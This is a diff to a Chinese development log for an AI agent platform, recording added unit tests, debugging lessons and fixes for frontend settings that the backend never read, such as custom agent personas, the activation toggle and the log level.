+**新增测试（全量 1657 → 1685 全绿）：**
+- `test_tool_discovery.py`（9 项）——工具发现引擎（此前 0%）：精确名/关键词/标签/分类相关度、
+  排序/limit/min_relevance、按分类/标签获取、任务推荐（calc 命中）。
+- `test_context_budget.py`（14 项）——上下文预算（此前 0%）：allocate 分档（工具少/多/中）、
+  token 估算（中英）、工具描述 token 经验值、简化判断、记忆/对话轮次推荐、角色化预算。
+- `test_management_api_ext.py` 追加 5 项——causal-graph 端点：图数据（nodes/edges/stats）、
+  指标、节点详情（前驱/后继/关联事件/不存在抛 AppError）、因果树展开。
+
+**覆盖提升：** tool_discovery（0%）、context_budget（0%）、management 因果图端点（原 41 个
+零覆盖端点继续缩减）。
+
+**经验：** token 估算启发式（中文 3 字符/token、英文 4 字符/token）测试时要按公式算准确值，
+不要凭直觉断言大小关系（中文 70 字符实际比英文 100 字符 token 多）。
+
+### 27.13 继续补测：management 剩余端点（database/info-process/perception）
+
+**新增测试（全量 1685 → 1688 全绿）：**
+- `test_management_api_ext.py` 追加 3 项——`/database`（disk_cache 统计 + sqlite 表信息）、
+  `/info-process`（ImageAnalyzer/SpeechRecognizer 状态，mock 类）、`/perception`（感知系统状态，
+  started→running）。
+- 至此 management 41 个零覆盖端点仅剩少量（start/stop_perception、memory 事件 CRUD、skills 已覆盖、
+  clear_memory 等）。
+
+**注意（Python 坑）：** `modules.database.disk_cache` 的包属性被 `__init__` 里的 `disk_cache` 实例
+遮蔽——`import modules.database.disk_cache as dc` 绑定的是 **DiskCache 实例**而非模块
+（`dc` 无 `disk_cache` 属性）。测试应 `from modules.database.disk_cache import disk_cache` 直接拿实例
+再 monkeypatch 方法。
+
+**覆盖提升：** management 端点几乎全绿；加上前几轮，0% 模块（utils/providers/identity_loader/
+values_store/tool_discovery/context_budget/ModelRunnerManager）已全部有覆盖。
+
+### 27.14 继续补测：memory 事件 CRUD + ModelRunner 方法
+
+**新增测试（全量 1688 → 1707 全绿）：**
+- `test_management_api_ext.py` 追加 6 项——memory 事件 CRUD（create/get/update/delete、不存在抛
+  NOT_FOUND、clear_memory 清空）、tool-skills 废弃端点。management 41 个零覆盖端点全部覆盖。
+- `test_model_runner_methods.py`（13 项）——ModelRunner 此前 14 个方法零覆盖，本轮覆盖核心：
+  `_has_required_tool_args`/`_missing_required_tool_args`（calc schema 必填参数验证：全参/缺参/
+  空值/未知工具）、`_build_tool_guard_prompt`（工具少极简 / 工具多详细 / large 层级强制详细）、
+  `_build_tool_prompt_section`（占位空串）、`_build_prompt`（任务描述/身份/角色边界/guidance/
+  技能叠加仅 large 层级）。
+
+**经验：** prompt 类方法断言时先确认实际文案（`【工具调用硬性规则】` 而非 `【工具调用规则】`）——
+用 `in` 子串断言时以生产代码真实输出为准，不要凭方法名猜。
+
+**覆盖提升：** management 全部端点有覆盖；ModelRunner 方法从 14 个零覆盖缩到少量重型方法
+（`_wait_for_user_response`/`_run_runtime_expert` 等需真实推理链路）。
+
+### 27.15 继续补测：ModelRunner 交互等待方法
+
+**新增测试（全量 1707 → 1713 全绿，`test_model_runner_methods.py` 追加 6 项）：**
+- `_wait_for_user_response`/`resolve_user_response`——future 等待 → resolve 回填返回、清理 pending、
+  超时返回 `{"timeout": True}`、未知 request_id 不报错
+- `_handle_ask_user_intent`——resolve 后返回 `【用户意图】用户的回答：...`
+- `_handle_mode_change_request`——批准（`ToolSecurityGate.resolve_review` 回填 → 切换
+  `settings.EXECUTION_MODE` 并恢复）与拒绝（返回拒绝文案）
+
+**经验：** ① 交互类方法（future 等待）测试用"任务 + sleep 到挂起点 + resolve + wait_for"模式；
+② `_handle_ask_user_intent` 解析 `result["answer"]` 而非 `response`，resolve payload 字段名要与
+消费方一致；③ `ToolSecurityGate._pending_reviews` 是**类属性**，模块级 `tsg._pending_reviews` 访问不到。
+
+**覆盖提升：** ModelRunner 重型交互方法（审批/提问等待）已覆盖；剩余极小（`_run_runtime_expert`、
+`_on_wakeup_message` 等需完整运行链路）。
+
+### 27.16 收尾：ModelRunner 剩余方法 + 文档结构修复
+
+**新增测试（全量 1713 → 1721 全绿，`test_model_runner_methods.py` 追加 8 项）：**
+- `_format_messages_for_context`（ChatMessage/字典/dict content thinking_result 提取/最近 20 条截断）
+- `_consume_guidance`（pending 引导消费 → `thinker.add_external_prompt`）
+- `_check_messages`（mock bus.receive 返回消息 → 标准化字段）
+- `_on_wakeup_message`（设置 wakeup_event）
+
+至此 ModelRunner 此前 14 个零覆盖方法仅剩 `_run_runtime_expert`/`_build_runner_prompt`（需完整运行链路）。
+
+**文档结构修复：**
+- §21（主动搭话旁路）标题原拼接在 §18 末尾（缺换行）+ 编号乱序（在 §19/§20 之前）——已拆行并移动到 §20 之后，恢复 18→19→20→21→22 顺序。
+- §25 的"默认行为不变（向后兼容）"已被后续 generate 必填化取代——加注记指向 §27.8。
+- 抽查 §26/§27.4/§27.8/§27.10/§27.11 记录与实际代码一致（validate_attachments、fail-closed、
+  providers 接线、pipe-to-shell 正则、ApiLogStore.stop）。
+
+### 27.17 纯对话模式提示词设置无效（前端设置不生效）
+
+**现象：** 用户在编排页给自定义总指挥 agent 设置人设后，**纯对话模式**（chatonly）对话时 system prompt 完全不变。
+
+**根因：** 纯对话是单一人格——`chat_light/prompt_composer.py` 硬编码只读 **`orchestrator`** 角色的
+`get_persona("orchestrator")`/`get_system_override("orchestrator")`。而编排页自定义 agent（tier=large）
+的人设保存在 `personas.yaml` 的**自定义 role key**（如 `'123'`），不在 `orchestrator` 下 →
+纯对话读取不到 → 设置无效。agent 模式按各角色 key 读所以生效。
+
+**修复（`chat_light/prompt_composer.py`）：** `orchestrator` 无自定义人设时，回退到用户自定义的
+**large-tier 总指挥 agent** 人设（遍历 `get_custom_agents()` 取 tier=large 的第一个有 persona 的）。
+`system_override` 优先级不变（非空直接用）。
+
+**验证：** 新增 2 项测试（`test_chat_light_prompt.py`）：orchestrator 无人设 → 回退自定义 large agent
+人设生效；orchestrator 有人设 → 优先不回退。全量 1723 通过。
+
+**经验：** 这是 §18/§22"配置改了但消费方不读"模式的又一次出现——前端把配置写到 A 位置（自定义 role），
+后端消费方读 B 位置（orchestrator），两端 key 不匹配。排查"设置无效"先对前端保存的 key 与后端读取的
+key 做映射核对，再验证真实链路（`set_persona → build_system` 输出）。
+
+### 27.18 自定义 agent 未接入调度（存了没人读，§22 消费方审计盲区）
+
+**现象：** 编排页「新增」自定义 agent（选层级/写 model_id/存人设）后，agent 模式无法真正调度它——
+只有纯对话模式（§27.17 修复）读 large-tier 自定义 agent 人设生效；agent 模式 `start_runner` 直接拒绝。
+
+**根因：** `identity.py::get_identities()` 只从 `config/prompts/roles.yaml` 加载身份模板，
+**从不合并 personas.yaml 的自定义 agent**。而 agent 模式调度 `ModelRunnerManager.start_runner`
+用 `identity_key not in get_identities()` 拒绝未知身份 → 编排页创建的自定义 agent 身份不在身份表
+→ 永远无法启动。`model_id` 字段也无消费方（模型实例仍按 tier 默认创建）。
+
+**为什么测试没抓到：** ① `get_identities` 全部被 mock，从无"应含自定义 agent"的契约断言；
+② `create_custom_agent` 端点在 `api/main.py`（非 `modules/management/api.py`），§27.x 端点审计范围
+漏掉它，零测试；③ `start_runner` 未知身份测试用假身份字典，掩盖"真实自定义身份不在"。
+**本质：这是 §18/§22"存了没人读"的又一样式，且 §22 消费方审计只覆盖配置 key，没延伸到
+"前端创建的对象（agent）是否被调度消费"。**
+
+**修复：** `get_identities()` 合并 personas.yaml 的 custom agents（转成身份模板结构）；
+模型创建按自定义 agent 的 `model_id`/tier 选择；调度层可启动自定义角色。
+
+**经验：** 排查"存了没人读"必须对**每个前端写操作入口**（不只是配置 key）追到后端消费方——
+编排页新增/人设/权限/模型参数/激活开关都要验证"存进去的东西是否真的被读"。
+
+### 27.19 全量消费方审计修复（前后端"存了没人读"清理）
+
+按 §27.18 教训扩展 §22 消费方审计到**所有前端写操作**（40+ 端点 → 保存数据 → 调度消费方），
+修复 5 处：
+
+1. **共享 dict 污染（identity）**：`_load_from_yaml` 直接改 `loader.load("roles")` 的共享 dict，
+   自定义 agent 合并会残留污染后续加载 → 浅拷贝。
+2. **agent_active 激活开关无调度消费**：编排页开关只保存展示，`start_runner` 从不检查 →
+   禁用的 agent 照样启动。`start_runner` 加 `get_agent_active is False` 拒绝。
+3. **persona-presets 读侧 500**：`get_persona_presets` 写 `for k,v in presets.values()`（对 3-key
+   dict 解包崩溃）→ 预设保存后永远列不出/无法应用。改 `presets.items()`。
+4. **自定义 agent 人格不进 system prompt**：`config/prompts/composer._get_role` 只读 roles.yaml，
+   自定义角色回退 orchestrator 克隆 → 改从 `get_identities()` 查找（含编排页自定义 agent）。
+5. **expertise 逗号字符串拆字**：identity 合并时 expertise 原样存字符串，`from_template` 的
+   `list(...)` 拆成单字符 → 合并时逗号转 list。
+6. **LOG_LEVEL 摆设**：`setup_logger` 硬编码 "INFO"，设置页 LOG_LEVEL 改动无效 → 默认从
+   `settings.LOG_LEVEL` 读。
+
+**已正确消费（无需改，供对照）**：personas/system_overrides/role_tools/model_params、skills
+enabled/forced/role-skills、tools enabled（可见性）、scheduled_tasks prompt/outreach、todos、记忆库切换。
+
+**可加强（非摆设）**：tools enabled 只过滤可见性，`tool_security_gate` 执行路径不拦截已禁用工具直呼。
+
+**验证：** 新增 `test_custom_agent.py`（11 项：身份合并/删除失效/端点/调度/激活开关/预设读侧/
+composer 自定义人格/LOG_LEVEL）；全量 1733 通过。
